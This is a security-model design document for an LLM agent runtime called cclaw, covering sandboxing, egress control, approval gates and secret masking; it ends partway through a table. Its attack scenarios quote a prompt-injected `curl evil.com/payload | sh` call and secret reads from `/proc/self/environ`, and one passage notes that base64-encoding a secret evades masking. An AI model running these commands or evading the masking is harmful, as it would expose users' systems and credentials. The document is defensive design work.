# Security Model

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────┐
│  TRUSTED                                                │
│  Long-lived process (CLI or daemon) — unsandboxed,      │
│  holds all secrets, sole writer to cclaw.db, dispatches │
│  LLM calls on a worker thread pool                      │
├─────────────────────────────────────────────────────────┤
│  TRUSTED (config-constrained)                           │
│  Same binary, same process — runs the agent loop, tool  │
│  dispatch, and session state machine.                   │
│  Constrained by: setrlimit, egress proxy, config values │
├─────────────────────────────────────────────────────────┤
│  UNTRUSTED                                              │
│  --run-tool broker children (re-exec'd) — execute       │
│  LLM-directed shell/web/js/file tool calls              │
│  Sandboxed by: namespaces, proxy, env stripping         │
│  Cannot: reach arbitrary hosts, read secrets, escape fs │
└─────────────────────────────────────────────────────────┘
```

| Component | Trust level | Why |
|-----------|-------------|-----|
| Main process (CLI/daemon) | Full | Your binary, root of trust, holds encryption key |
| Agent loop (same process) | High (self-constrained) | Your binary, but executes LLM-directed logic; respects DB + env config |
| LLM output | Untrusted input | Adversarial by assumption (prompt injection, jailbreaks) |
| --run-tool broker children | Untrusted | Re-exec'd for each tool call; kernel-sandboxed (shell/web/js/file tiers) |
| JS runtime (in broker child) | Untrusted | Executes LLM-generated code; heap-capped, instruction-limited |
| External HTTP responses | Untrusted | Wrapped in boundary markers, homoglyph-sanitized |

## Agent Process: Trusted Binary, Config-Constrained

The agent process is **your compiled code** — not a container running arbitrary payloads. The security model relies on the agent binary correctly implementing:

1. **Config loading** — reads config from cclaw.db (main process) or `CCLAW_*` env vars (re-exec'd children), builds internal policy structs
2. **Egress enforcement** — all sandboxed tool children (shell, web, js) run inside a network namespace; outbound connections are forced through the credential proxy where `host_decide()` (`src/proxy.c`) checks each hop against the agent's allowed-hosts rules — including redirects
3. **Tool dispatch** — workspace path validation, shell timeout, iteration limits
4. **Secret handling** — holds decrypted API key in memory, never logs it, never passes to shell children

### What Could Go Wrong

| Failure mode | Impact | Mitigation |
|--------------|--------|-----------|
| Bug in policy enforcement | Agent reaches blocked host | Code review; integration tests |
| Agent ignores config limit | Infinite loop, resource exhaustion | `setrlimit` is kernel-enforced (can't be bypassed from userspace) |
| Memory corruption | Arbitrary behavior | `-Wall -Wextra -Werror`, ASAN in dev, arena allocator limits scope |
| Agent leaks secret to LLM context | Key visible in session history | Never include provider-native env var (e.g. `OPENROUTER_API_KEY`) in any message/tool_result; grep for leaks in tests |
| Agent writes to wrong DB | Cross-agent data corruption | Agent only opens `CCLAW_DB_PATH` path; writes scoped by agent_name |

### Why This Is Acceptable

- Single user — no multi-tenant isolation requirement
- Binary is compiled from audited source — not downloaded/executed dynamically
- Long-lived process with per-tool isolation — untrusted work runs in short-lived `--run-tool` broker children (re-exec'd, namespace-sandboxed), not in the parent
- `setrlimit` provides hard kernel caps regardless of bugs
- Namespace sandbox for tool children provides filesystem isolation even if code has path-traversal bugs

## Config Loading

The main process (CLI or daemon) loads config via `config_load(db)` (`src/config.c:247`), which reads from cclaw.db's `config` table with env-var overrides. Re-exec'd `--run-tool` broker children load config via `config_load_from_env()` (`src/config.c:150`), which reads only `CCLAW_*` env vars injected by the parent at exec time.

### Principles

1. **Two loaders, one model** — main process reads DB + env overrides; tool children read only env (they have no DB handle). Both produce the same `Config` struct, immutable after load.
2. **Parse once, validate early** — `config_load_from_env()` runs at child startup, validates all values, fails fast on malformed input. `config_load(db)` does the same at main-process startup.
3. **Immutable after load** — config struct is read-only for process lifetime; no runtime config reload
4. **Fail closed** — missing required var (e.g. `CCLAW_DB_PATH`) → process exits immediately
5. **Minimal surface** — tool children receive only what they need; daemon internals stay in the parent

### DB path resolution

`resolve_db_path()` (`src/main.c`) checks `CCLAW_DB_PATH` first, then falls back to `$HOME/.cclaw/cclaw.db`. The env override is `CCLAW_DB_PATH`, not `CCLAW_DB`.

### Env Var Security Properties

| Var | Sensitivity | Notes |
|-----|-------------|-------|
| `CCLAW_AGENT_NAME` | Low | Identity string |
| `CCLAW_DB_PATH` | Low | Path to cclaw.db (overrides default `~/.cclaw/cclaw.db`) |
| `CCLAW_WORKSPACE` | Low | Path |
| `CCLAW_MODEL` | Low | Model name string |
| `CCLAW_MAX_ITERATIONS` | Low | Integer cap |
| `CCLAW_ALLOWED_HOSTS` | Medium | Defines network perimeter — must not be tampered with |
| `CCLAW_TOOLS` | Medium | Tool whitelist — controls agent capabilities |
| `CCLAW_SHELL_TIMEOUT` | Low | Integer |
| provider-native env var (e.g. `OPENROUTER_API_KEY`) | **High** | Decrypted secret — cleared from env after read |
| `CCLAW_DAEMON_DB` | Low | Path (only if read access granted) |
| `CCLAW_TOKEN_RATE_LIMIT` | Low | Integer |

### Best Practices for Tool-Child Config

1. **Clear secrets from env immediately after reading**
   ```c
   const char *key = getenv(cfg->provider.api_key_env);
   char *api_key = strdup(key);  // copy to heap
   unsetenv(cfg->provider.api_key_env);  // remove from environ
   ```
   Why: `shell_exec` children inherit env. Sandbox setup already strips CCLAW_*/API-key vars before exec (src/sandbox.c), but defense-in-depth says don't keep secrets in env longer than necessary.

2. **Validate allowed_hosts before use**
   ```c
   // Reject private IPs in allowed_hosts (daemon should have caught this, but verify)
   for (int i = 0; i < policy.allowed_count; i++)
       if (is_private_ip(policy.allowed[i])) abort();
   ```

3. **Treat CCLAW_TOOLS as a whitelist, not a suggestion**
   - If tool not in list → don't register it
   - Empty list = no tools (not "all tools")
   - Unknown tool name → skip silently (forward compat)

4. **Don't expose config values to LLM**
   - System prompt should not contain `allowed_hosts` list (tells attacker what's reachable)
   - Don't include workspace path in error messages sent to LLM
   - Tool errors: generic "permission denied", not internal details

5. **Log config at startup (debug level), never log secrets**
   ```c
   fprintf(stderr, "[agent] name=%s model=%s tools=%s hosts=%s\n",
           name, model, tools_csv, hosts_csv);
   // Never: fprintf(stderr, "api_key=%s\n", api_key);
   ```

6. **Daemon validates before injection**
   - `allowed_hosts` entries must be valid hostnames (no paths, no wildcards except `*.domain`)
   - `max_iterations` must be positive integer ≤ 200
   - `workspace` must be under `.cclaw/agents/` (prevent path traversal)
   - `tools` must be subset of known tool names

## Defense-in-Depth Layers

Ordered from most to least critical:

| # | Layer | Scope | Kernel-enforced? | Bypassable by agent? |
|---|-------|-------|------------------|---------------------|
| 1 | `setrlimit` | Agent + children | Yes | No |
| 2 | Namespace sandbox | Shell/qjs children | Yes | No (separate process) |
| 3 | Credential proxy (`proxy.c` `decide()`) | Shell/web/js children network | Yes (netns) | No (separate netns) |
| 4 | Env stripping | Shell children | No (app-level) | Only via code bug |
| 5 | `prctl(PR_SET_PDEATHSIG)` | Orphan cleanup | Yes | No |

Layers 1–3 are hard boundaries (kernel-enforced, separate address space).
Layer 4 is a soft boundary (correct code required).
Layer 5 is bonus hardening (unavailable on some targets).

(The former layer 4 here was `http_check_policy()` — a pre-flight URL check
for `web_fetch`. It's been removed: `web_fetch`/`js_eval` now run inside the
same sandboxed-proxy model as `shell_exec`, so egress for all three tools is
decided by layer 3's `decide()` on every hop, including redirects, which a
single pre-flight check could never see. See `shell-networking.md` and
`egress-filter.md` §8.)

**Don't run cclaw as root.** The namespace sandbox maps the invoking uid to
root inside the child's user namespace (uid_map `0 <uid> 1`, `sandbox.c`).
When the invoking uid is already 0, the child holds *real* root over any
filesystem objects the host uid 0 owns that leak into its mount view, and
read-only bind remounts lose much of their bite (root can often remount or
bypass DAC where an unprivileged mapped uid cannot). Layer 2 degrades from a
hard boundary to a soft one. Run cclaw as an unprivileged user; root is only
appropriate for throwaway containers/VMs where the whole host is disposable.

## Sub-Agent Privilege Reduction

Two orthogonal mechanisms, both per-turn DB queries:

- **Grants** (`grants` table) = what an agent may *ever* use. Authority, keyed
  by agent identity. Only the approval gate adds rows.
- **Session `tool_filter`** (`sessions.tool_filter`) = what *one session* will
  use. A positive JSON array of tool names, frozen at spawn; `NULL` =
  unrestricted. Effective tools = **grants ∩ filter** — intersection-only.
  Listing an ungranted tool in a filter is a no-op; a filter can never grant.

**Enforcement** happens at both existing gates, re-read from the session row
every turn (no cached state to drift):
- *Payload* (`llm_build_payload`): the tool array shown to the model is
  grants ∩ filter. An agent with zero grants sees zero tools.
- *Dispatch* (`dispatch_tool`): after the grant check, `session_tool_allowed()`
  denies filtered tools with "blocked by this session's tool filter"
  (fail-closed: unknown session ⇒ deny).

**Self-spawn** (`launch_agent` with no `name`): child runs as the *calling*
agent — same grants, fresh session, task in inbox. Filter resolution:
explicit `tools` arg → config `worker_tools` (conservative default: file tools,
shell_exec, web_fetch, js_eval, check_session, check_approval, search_config;
no memory mutators, no config/agent/extension tools, no launch_agent) →
unrestricted. Passing `tools` with a `name` is an error.

**Named spawn** (launch existing agent): child runs under the target agent's
own grants, unfiltered. The target must already exist (not created at spawn
time); the model picks from a live roster embedded in `launch_agent`'s
description (`agents.name` + `agents.description`, recomputed each turn).

**Lifting a filter** is a manual operation, deliberately outside the agent's
reach: `UPDATE sessions SET tool_filter=NULL WHERE id=?`.

Filters are tools-only in v1 (bare tool names, not `kind:value`); host/path
narrowing may extend the same column later. Depth/concurrency caps apply to
self-spawn unchanged.

## Grants, Approvals, and Tool Dispatch

The grants system is the runtime authorization layer. It determines what an agent may do, how tool calls are gated, and how capabilities are acquired.

### Dispatch gate order

When a tool call arrives from the model, dispatch (`src/main.c:369`) evaluates these gates in order. Each gate is restrict-only: it can escalate from ALLOW→ASK→DENY, never relax.

1. **Grant check** — `grants_contains(db, agent, "tool", name)`. No live grant row → hard deny with "not granted — request it with request_config".
2. **Session tool_filter** — `session_tool_allowed()`. Grants ∩ filter (positive list frozen at session spawn); blocks filtered tools.
3. **approval_mode** — `agent_tool_mode()` reads `grants.approval_mode` for this tool. `'silent'` → ALLOW, `'always'`/`'tool_decides'` → ASK.
4. **tools.policy** — `policy_eval(args, policy_json)`. Per-argument restrict rules on the tool definition; DENY or ASK.
5. **Hooks** — `hook_dispatch_gate_tool_call()`. Extension hooks run (veto-only: can escalate to ASK or DENY, never relax).
6. **Sensitivity scan** — `host_in_text()` over the raw args against `sensitive_targets` (registered-domain+subdomain, lookalike-robust). Match → ASK, approval tagged `action='sensitive'`.
7. **Credential-binding check** — `secret_placeholder_names()` filtered to loaded secrets. Any used secret with zero `secret_hosts` bindings → ASK; a url-carrying call whose url host isn't covered by every used secret's bindings → ASK. Approval tagged `action='secret_bind'`.
8. **Approval park** — if gate == ASK: look up existing approval; if none or pending, park session (`awaiting_approval`). Resume on approve/deny.

### The two sensitivity-axis rules (specs/trust.md)

Beyond the gate, both rules have a proxy-level enforcement half (the load-bearing one — the arg scan sees what the model wrote, the proxy sees what actually connects):

- **Sensitive targets**: labels ride every network-tier `RunToolReq` as `deny_rules`; `host_decide()` checks deny **before** allow, so no grant makes a sensitive host ambiently reachable. `resolve_approval` coerces ALWAYS→ONCE for `sensitive` approvals; an approved call gets a per-call exception (matched host allowed, its covering labels dropped from the deny list, for that one consumed call).
- **Secret bindings**: a shell/js call carrying loaded secrets has `host_rules` replaced by the union of the secrets' bound hosts (`call_egress_build`, `src/main.c`) — unbound ⇒ empty ⇒ deny-all. ALWAYS on a url-carrying `secret_bind` park records the binding ("approve & bind"); shell/js ALWAYS coerces to ONCE. Operator pre-seeding: `cclaw sensitive add|rm|list`, `cclaw secret-bind <name> <host>|rm|list` — deliberately CLI-only, no agent tool writes these tables.

### grants.approval_mode

Each grant row carries an `approval_mode` column (`'silent'` | `'always'` | `'tool_decides'`), read by `agent_tool_mode()` (`src/agent_config.c:329`). This controls whether a granted tool runs freely or requires per-call human confirmation:

| Mode | Behavior |
|------|----------|
| `silent` | Tool runs without prompting (default for new grants) |
| `always` | Every call parks for approval |
| `tool_decides` | Tool's own policy/hooks determine whether to ask |

Set via `agent_config_set_tool_mode()` or the `--auto-approve` path.

### grants.expires_at (self-expiring grants)

Grant rows may carry an `expires_at` unix timestamp. `grants_json()` (`src/agent_config.c:438`) filters expired rows with `expires_at IS NULL OR expires_at > unixepoch()`, so they silently vanish without manual cleanup. Used by `--auto-approve` to issue time-bounded ambient grants.

### request_config tool

The model acquires new capabilities at runtime via `request_config` (`src/tool_request_config.c`). Actions:

| Action | Key | Effect on approval |
|--------|-----|--------------------|
| `grant_tool` | tool name | Parks → on approve, inserts `grants` row (kind='tool') |
| `grant_host` | hostname | Parks → on approve, inserts `grants` row (kind='host') |
| `grant_path` | absolute path | Parks → on approve, inserts `grants` row (kind='read_path' or 'write_path' per `mode`) |
| `rename_agent` | new name | Parks → on approve, renames agent |

All actions use `resolve='apply'` approvals (ambient capability grants, not one-shot reruns).

**Session-scoped denial dedup**: if the same `(action, key=value)` was already denied in this session, `request_config` returns an immediate error instead of re-parking — prevents the model from spam-requesting a denied capability.

### read_path / write_path grants → sandbox bind-mounts

Path grants (`kind='read_path'` or `kind='write_path'`) become extra bind-mounts inside the sandboxed tool child. `agent_setup_init()` (`src/agent_setup.c:56`) loads them into the `SandboxProfile`, and `sandbox.c:282` mounts them (canonicalized, deduped, rw-wins, sorted shallow→deep) alongside the workspace.

### --auto-approve (CLI)

`--auto-approve` (`src/main.c:1446`) answers approval parks without prompting:

- **rerun** approvals → resolved as ONCE (single use, no durable state)
- **apply** approvals → resolved as ALWAYS with a self-expiring grant (`expires_at = now + approval_timeout_sec`), so ambient capabilities auto-revoke after the timeout

This means `--auto-approve` never creates permanent grants — only time-bounded ones.

### Non-interactive mode

When stdin is not a tty (`-p` piped mode), approvals are auto-denied (`APPROVAL_DENY`, reason `"auto:no-approver"`). The model must already have all needed grants before the session starts.

## Attack Scenarios

### Prompt injection → shell escape

LLM is tricked into calling `shell_exec("curl evil.com/payload | sh")`.

Mitigations:
- Shell child in network namespace → all TCP redirected to proxy
- Proxy checks `evil.com` against `allowed_hosts` → denied
- Even if proxy bypassed: filesystem is read-only (namespace remount)
- Even if file written: workspace only, no execute permission on workspace mount

### Prompt injection → secret exfiltration

LLM tries to read API key via `shell_exec("env")` or `file_read("/proc/self/environ")`.

Mitigations:
- All CCLAW_* and API key vars unset before shell exec
- `file_read` restricted to workspace
- `/proc/self/environ` blocked by namespace (/ is read-only, /proc remounted minimal)
- Agent clears provider-native env var (e.g. `OPENROUTER_API_KEY`) from own env after startup read

### Agent code bug → writes wrong DB

Agent has path traversal in `db_open()` and opens another agent's DB.

Mitigations:
- Agent receives DB path via `CCLAW_DB_PATH`; all data scoped by agent_name column
- No cross-agent data access (agent_name enforced in queries)

### Malicious config in cclaw.db

Attacker compromises cclaw.db, sets `allowed_hosts: ["evil.com"]`.

Mitigations:
- cclaw.db is mode 0600, owned by daemon user
- Agent config changes require admin approval
- Daemon validates config sanity before fork
- This is a "game over" scenario — if cclaw.db is compromised, attacker has full control regardless

## Single-User Assumptions

CClaw is designed for one user. This simplifies the security model:

- No need for inter-user isolation (all agents serve one person)
- Admin approval = the operator approving via Telegram (not a separate security principal)
- "Trusted binary" assumption holds because the operator compiles it himself
- Secrets encrypted at rest protect against exfiltration of `cclaw.db` *alone* (leaked backup, mis-scoped copy) — **not** full-disk theft (the key file goes with it) or the running system. See [Secret Storage](#secret-storage) for the key-protection ceiling.
- Rate limiting protects against runaway costs, not against malicious users

If CClaw ever becomes multi-user, the trust model changes fundamentally:
- Agent processes would need hard isolation (containers, VMs)
- Config injection would need cryptographic attestation
- Daemon.db would need per-user access control
- This is explicitly out of scope.

## Secret Storage

Secrets are stored encrypted using ChaCha20-Poly1305 AEAD, in one table: `secrets`. The `scope` column splits its two audiences — `agent` rows (user/agent-minted credentials, see [Secret Store](#secret-store) below) feed interpolation and child injection; `system` rows (provider API keys, via `db_secret_get_system()`) are daemon-consumed only and never enter the agent-facing snapshot, so `{{SECRET:OPENROUTER_API_KEY}}` does not resolve. The `config` table holds no ciphertext at all. The 32-byte encryption key lives in `.cclaw_key` on disk, loaded once at daemon startup via `db_set_secret_key()`, never written to the DB. No code outside `src/db.c` touches the raw ciphertext in either table.

Provider API keys resolve env → system-scope secret: `config_load()` reads the provider's `api_key_env` variable first and falls back to the encrypted `secrets` row (scope `system`) under the same name (admin `set key` and `configure_provider` write there). cclaw has **no `.env` parser** — a `.env` file is user-managed dev convenience that the user's own shell sources before launching cclaw.

**Key-protection ceiling.** The DB store is encrypted at rest, but the key sits on the *same disk* as the ciphertext. Whole-disk theft yields both → plaintext. So the built-in store protects against *exfiltration of `cclaw.db` alone* (a leaked backup, a mis-scoped file copy) — **not** against full-disk capture or the running host. Closing that gap means deriving the key from a user passphrase (KDF) or binding it to hardware (TPM / Secure Enclave) — which is exactly what a keychain storage provider gets for free (see [Storage providers](#storage-providers)). For a single-user box a chmod-600 key file is a reasonable default; it is not a substitute for a hardware-backed vault, and users who care should use the keychain provider.

**The key file is masked from every sandboxed shell child.** `.cclaw_key` lives next to `cclaw.db` (`<dir of db_path>/.cclaw_key`). That directory is *not* in the workspace, so `standard`/`restricted` agents — which bind only the workspace — never see it by construction. But `trusted` binds the **CWD rw**, and in CLI mode the CWD *is* the dir holding the key and the DB, which would otherwise expose both to a shell child (key + ciphertext = full secret compromise). To close that, `shell_apply_namespace()` **bind-masks** the key and the DB family (`cclaw.db`, `-wal`, `-shm`) inside the new mount namespace: after the CWD/workspace binds and before `pivot_root`, an empty read-only file is bound over each. Files not reachable in the child's mount tree are skipped — they are already invisible by omission.

The one remaining exposure is **`host`** (`--trust-host` / no-userns dev mode): it runs with *no* sandbox, so a shell child reads the host filesystem directly, key included. That is the documented price of `host` — never run untrusted-derived work at `host` on a box whose `.cclaw_key` matters. See [Sandbox Profile Policy Bundles](#sandbox-profile-policy-bundles).

### All secrets are injectable

Every secret cclaw stores is referenceable by the model via `{{SECRET:name}}`. This is the only model that makes sense: if the model needs to use a secret — typing a password into a browser field, passing a token in a curl header, authenticating an API call — it needs to know the name to write the placeholder. The security property is that the **value** never enters the context window, not that the name is hidden.

Which secrets the model is *told about* in the system prompt is a separate authoring concern. Operator-provisioned secrets (API tokens cclaw uses autonomously) go in the system prompt explicitly. User-provided credentials (a Gmail password for a login task) the model learns about through conversation — the user says "log into Gmail", the model asks what secret to use, the user says "it's stored as GMAIL_PASSWORD". Either way the contract is the same: model writes the placeholder, cclaw interpolates the value, value never hits context.

### What cclaw is and isn't

cclaw is a **secret broker**, not a password manager — but it *is* a secret store. The distinction is broker-vs-lifecycle, not store-vs-nothing:

- cclaw **owns** the broker: resolve at the trust boundary, inject into tool calls, mask on the way back, scope per-agent. This is the part that must be correct — it is the DLP filter, and it runs the same regardless of where the value is stored.
- cclaw **owns** storage only as a *provider* (see [Storage providers](#storage-providers)). The default DB store is convenience storage with a key-on-disk ceiling, not the root of trust a real vault gives you.
- cclaw **does not** own lifecycle: rotation, expiry, breach alerts, secure-entry UX, autofill, or per-access audit. That belongs to the OS keychain or whatever password manager the user already runs.

So "trust the agent to manage my passwords" is half-right: cclaw will *broker* them safely (the value never enters the context window), but it should not *be your vault* unless you accept the key-on-disk ceiling above. Users who care should point cclaw at a keychain provider and let the OS own key protection and lifecycle.

### Secret Store

Secrets are no longer only `CCLAW_SECRET_*` env vars collected at process startup — a DB-backed `secrets` table (name, encrypted value, `status`, `source`, `scope`, `created_at`) lets a secret be born *mid-session*, closing the "sign up for a new service" gap: an agent can mint a fresh credential without ever seeing the plaintext, and an operator can hand one to a running agent without a restart.

Three ways a secret enters the `secrets` table:

1. **Operator verb** — `cclaw secret set <NAME> [value] | rm <NAME> | list` (no value arg reads one line from stdin, keeping it out of shell history). `list` never prints values. Mirrors the existing `sensitive`/`secret-bind` CLI-only verbs.
2. **`secret_create` tool** — the agent mints a random credential (`getrandom()`, rejection-sampled into an `alnum`/`hex`/`full` charset, 8–128 chars) for a service that needs a *new* password (e.g. signing up for Trello). The generated value is written straight to the DB and never appears in the tool's arguments or result — only its `{{SECRET:name}}` placeholder does.
3. **DLP quarantine** (see below) — a credential the scanner catches in the wild (a user pastes one in chat, a tool result leaks one) is captured into the store instead of shredded.

**Per-call snapshot, not a cached array.** `secrets_snapshot(db, env_base, env_count)` (`src/secret_store.c`) merges the immutable env-collected base (`g_tool_setup->secrets`, fixed for the process lifetime) with a *fresh* `db_secrets_load()` read on every dispatch call — env wins on a name collision. This is why a secret created mid-turn is usable on the agent's very next tool call: nothing caches the DB read, and nothing mutates the borrowed env array (`tool_thread.h`'s "immutable post-setup" contract for `AgentSetup.secrets` holds). `EXEC_THREAD` tools re-snapshot on their own thread's db handle rather than receiving the dispatch-scoped snapshot, which wouldn't outlive the async thread.

**`status='pending'` is provenance/UX only.** A freshly minted or quarantined secret starts `pending`; a `secret set`-by-operator one starts `active`. Neither status gates anything — enforcement is already the existing fail-closed binding rule below: a secret with zero `secret_hosts` rows always parks on first use, regardless of status. `resolve_approval` flips `pending` → `active` the moment an ALWAYS-approval records the secret's first binding (specs/trust.md).

### Secret scoping (design — not yet implemented)

Each secret has a scope: `"*"` (all agents) or a comma-separated agent name list. Daemon enforces scope at injection time — an agent only receives secrets it is scoped for. Sub-agents inherit the intersection of their own scope and the parent's (same privilege-reduction rule as tools and hosts).

**Today**, secrets reach tool children via `CCLAW_SECRET_*` env vars collected by `shell_secrets_collect()` (`src/tool_shell.c:43`) at process startup, merged per-call with the DB-backed `secrets` table (see [Secret Store](#secret-store)). There is no per-agent scope enforcement yet — all secrets available to the process are available to all agents in it.

**Three orthogonal axes.** Secret access is *scope* — do not collapse it into sandbox_profile:

| Axis | Mechanism | Question it answers |
|------|-----------|---------------------|
| Stored | storage provider (DB / keychain) | does cclaw hold the value at all? |
| Scoped | `scope: "*"` or agent list | which agents *receive* it at injection? |
| Disclosed | system-prompt authoring | which agents are *told the name*? |

sandbox_profile governs sandbox strictness (env scrub, network, rlimits) — what a compromised agent can *do*, not which secrets it sees. The axes compose (a `restricted` agent with empty scope sees nothing and can reach nothing) but must stay independent: never gate secret access on sandbox_profile by accident.

### Storage providers (design — not yet implemented)

The planned interface is a thin provider abstraction — `secret_resolve(name)` / `secret_list()` — so the broker (resolve / inject / mask / scope) never knows where a value came from. Today, secrets are stored in cclaw.db's `secrets` table via `db_secret_set()` / `db_secrets_load()` / `db_secret_get_system()`, and reach tool children as `CCLAW_SECRET_*` env vars.

| Provider | Status | Key protection |
|----------|--------|----------------|
| cclaw.db ChaCha20 (`secrets` table) | #1, default | key file on disk (chmod 600) — see [key-protection ceiling](#secret-storage) |
| OS keychain (libsecret / macOS Keychain / Windows CredMan) | future | OS-managed, hardware-backed where available |
| User's existing password manager | future | owned by the PM |

A keychain or PM provider slots in **without touching the DLP layer** — the broker calls the same two functions. One unavoidable constraint holds for every provider: even a hardware-backed secret must be pulled into process memory transiently for injection and masking. "Value never lives in cclaw" can only mean *never persisted by cclaw, held only for the duration of a turn.*

### DLP Quarantine (built) vs. Future Secret Agent (still not implemented)

When a user pastes a raw credential into the conversation (e.g. "here's my token: ghp_abc123..."), or a tool result carries one, the AC scanner fires. The storage half of the originally-planned flow is now built as **quarantine**, replacing outright redaction:

```
Text crosses a trust boundary → AC scanner detects pattern
  → tool_result_postprocess_q (src/secret_quarantine.c) captures it:
      db_secret_set(name="PENDING_<RULEID>_<n>", source='quarantine', status='pending')
  → text the model/session sees carries {{SECRET:PENDING_<RULEID>_<n>}}, never the raw value
```

`inbox_insert_scanned` (`src/db.c`) — the classic "user pastes a key in chat" path — and all three tool-result postprocess sites (inline dispatch, sandboxed-child reap, tool-thread) route through this same wrapper. A value repeated within one scanned result, or matching an already-known secret's value, reuses that secret's name instead of minting a duplicate. A spam guard (pending count ≥ 32) falls back to the old `secret_scan_redact` shred, so a hostile page can't fill the store with junk rows.

**Still not implemented**: naming and routing intelligence. The auto-generated `PENDING_<RULEID>_<n>` name is a placeholder an operator/agent can rename later (`cclaw secret set <NEW_NAME>` + `cclaw secret rm PENDING_...`, or vice versa) — there is no LLM inferring "this looks like a GITHUB_TOKEN" and no dedicated ZDR-routed Secret Agent extracting name+value out-of-band. The original design (route the raw text to a zero-data-retention model endpoint so the plaintext never touches a provider's logs, with a single privileged `secret_store_write` tool gated on its own grant) remains a possible follow-up if auto-naming quality matters enough to justify it.

Open questions deferred: secret TTL/rotation, audit trail of per-agent access, multi-secret OAuth transactions, smarter auto-naming.

## DLP Pipeline: Resolve / Inject / Mask

Every piece of text that crosses a trust boundary goes through a consistent three-verb pipeline. The verbs always run in this order; never skip one, never reorder.

```
                   ┌─────────────────────────────────────┐
                   │         CONTEXT WINDOW               │
                   │   (entries table, LLM messages)      │
                   │                                       │
                   │  Placeholders only: {{SECRET:name}}  │
                   │  No raw secret values ever stored     │
                   └──────────┬──────────────┬────────────┘
                              │              │
                   [INJECT]   │              │  [MASK]
                              ▼              ▼
                   ┌──────────────────────────────────────┐
                   │         TRUST BOUNDARY                │
                   │  tool dispatch / shell fork / inbox   │
                   └──────────────────────────────────────┘
                              │
                   [RESOLVE]  │
                              ▼
                   ┌──────────────────────────────────────┐
                   │         SECRET STORE                  │
                   │  cclaw.db config enc + CCLAW_SECRET_* │
                   └──────────────────────────────────────┘
```

### Resolve

`shell_secrets_collect()` (`src/tool_shell.c:43`) loads secrets from `CCLAW_SECRET_*` env vars at process startup into a `ShellSecret[]` array, then clears them from the environment:

1. `shell_secrets_collect()` — scans `environ` for `CCLAW_SECRET_*`, copies name+value, unsets from env

Minimum value length: 8 chars. Shorter values are skipped with a warning — they are both weak secrets and dangerous to mask (too many innocent matches in output).

Values are held in process memory for the duration of the turn, then freed. They are never written to any log or DB column.

### Inject

Before a tool handler runs, `secret_interpolate()` replaces `{{SECRET:name}}` in the tool arguments with the real value. The interpolated string is a transient local passed to the handler and freed immediately; the persisted tool-call arguments (`tc->arguments`) keep the placeholder, so context/history never holds the value.

Injection is restricted to tools that actually exec with credentials (`tool_needs_interpolation()` — `shell_exec`, `web_fetch`, `js_eval`). Tools that only read files or query the DB don't need it and don't get it.

**Two delivery channels into a shell child** (both available; pick by quoting context):

| Channel | How the model writes it | Where the value lands |
|---------|------------------------|------------------------|
| Placeholder interpolation | `curl -H 'Bearer: {{SECRET:X}}'` | the value, substituted into the **command string / `/bin/sh` argv** |
| Env injection | `curl -H "Bearer: $CCLAW_SECRET_X"` | `CCLAW_SECRET_<NAME>=<value>` in the child **env**, stripped before any grandchild |

Placeholder interpolation is the **primary** channel: it is robust to quoting. Note the single-quote case — `'Bearer: {{SECRET:X}}'` interpolates correctly, but `'Bearer: $CCLAW_SECRET_X'` would **not** expand (single quotes suppress shell expansion). Env injection is a secondary mechanism for tools that read credentials from the environment, not an interchangeable alternative.

**Env injection is scoped to referenced secrets.** A shell child receives `CCLAW_SECRET_<NAME>` only for the secrets whose `$CCLAW_SECRET_<NAME>` token actually appears in the command (`shell_filter_secrets()`). Secrets used via `{{SECRET:NAME}}` are already interpolated into the command and get no env var. This is least-privilege: without it, every command would carry the agent's entire scoped credential set, and a single `cat /proc/self/environ` would dump them all.

**Why argv exposure of the in-use secret is bounded, not a hole.** A secret the command *uses* must be plaintext somewhere in that process — argv (`/proc/self/cmdline`), env (`/proc/self/environ`), or its heap. You cannot hide a value from the command that consumes it. What matters is not "can the child read it" but two containment properties, both of which hold:

- **It can't get back into the model's context.** A `... ; cat /proc/self/cmdline` leak is masked by `tool_result_postprocess()` *before* the result reaches the context window — the model only ever sees `{{SECRET:NAME}}`, never the plaintext. Defeating this requires the model to *encode* the value inside the command (`| base64 | rev`) so the known-value mask misses it — the documented "accidental, not determined-adversary" limit.
- **It can't leave to an attacker.** The shell child runs in `CLONE_NEWNET`; all egress is forced through the credential proxy's `allowed_hosts` allowlist. An encoded value still can't be POSTed anywhere off-allowlist.

The host never sees the value either (PID namespace + remounted `/proc`). For HTTP credentials specifically, the **proxy** is the only mechanism that denies the plaintext to the child entirely — it injects the auth header at the network boundary so the value never enters argv/env/heap at all (see [shell-networking.md](shell-networking.md)). That's the right tool for network tokens; interpolation remains necessary for non-network uses (a CLI password prompt, a token written to a config file).

### Mask

After a tool handler returns (and on all inbound user messages), two masking passes run in order, both inside `tool_result_postprocess()` — the **single masking chokepoint** for every tool. There is no per-tool masking; `shell_exec`, `web_fetch`, and `js_eval` all converge here so they get identical treatment.

**Pass 1 — Known-value mask** (`secret_deinterpolate`):
- Scans output for literal secret values **plus their base64- and URL-encoded variants**
- Replaced with `{{SECRET:name}}` so the model can re-reference on the next turn if needed
- Longest secret first to avoid partial matches on shared substrings

**Pass 2 — AC pattern scan** (`secret_scan` / `secret_scan_redact`):
- Catches secrets that leaked through output but weren't in the known store (e.g. a token from a `git config` dump, a key from an `.env` file read)
- O(n) single pass, no backtracking — see Secret Scanner section below
- Findings replaced with `[SECRET_DETECTED:<rule_id>]`

The token difference is by design: pass 1 *knows which secret it is* → re-referenceable `{{SECRET:name}}`; pass 2 only matched a *signature* → opaque `[SECRET_DETECTED:rule]`.

Both passes run before `entry_append` (tool results) and before `inbox_insert` (user messages). Nothing enters the entries table or context window without going through both.

### Per-tool flow

`shell_exec` is a forked tool, so its round-trip threads two forks; the value lives only in transient process memory and never on the persisted path:

```
tool_call args (placeholder)  ──► persisted to entries (placeholder kept)
   │
   ▼ fork #1 (tool-exec child, trusted C)
   │   secret_interpolate → real value in this child's heap
   │   tool_shell_handler
   │      ▼ fork #2 (sandbox child)  →  execl /bin/sh -c  (value in argv)
   │      stdout/stderr ─► pipe ─► handler returns raw output
   ▼ parent drains pipe
     tool_result_postprocess  ──►  deinterpolate (→ {{SECRET:name}}) + AC scan
     entry_append (masked)
```

All three credential tools run via the `--run-tool` broker (re-exec'd child, namespace-sandboxed) and share the parent chokepoint, so they behave uniformly:

| Tool | sandbox tier | interp site | known-value token | base64/URL masked | re-referenceable |
|------|--------------|-------------|-------------------|-------------------|------------------|
| `shell_exec` | SBX_SHELL | broker child | `{{SECRET:name}}` | yes | yes |
